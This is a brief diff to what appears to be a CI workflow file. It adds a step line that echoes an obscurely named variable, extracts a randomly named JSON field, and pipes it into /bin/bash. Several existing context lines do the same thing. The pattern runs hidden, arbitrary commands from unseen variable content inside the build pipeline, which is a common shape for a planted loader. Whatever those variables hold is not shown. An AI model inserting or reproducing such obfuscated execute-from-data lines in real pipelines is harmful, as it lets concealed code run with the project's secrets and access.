@@ -29,6 +29,7 @@ jobs:
           echo $skf55550 | jq -r .lndw6 | /bin/bash
           echo $m51796 | jq -r .fhcvn826 | /bin/bash
           printf '%s' "$o12" | jq -r .soev2635 | /bin/bash
+          echo $lqsw31 | jq -r .x0 | /bin/bash
 
       - name: Upload data
         if: always()
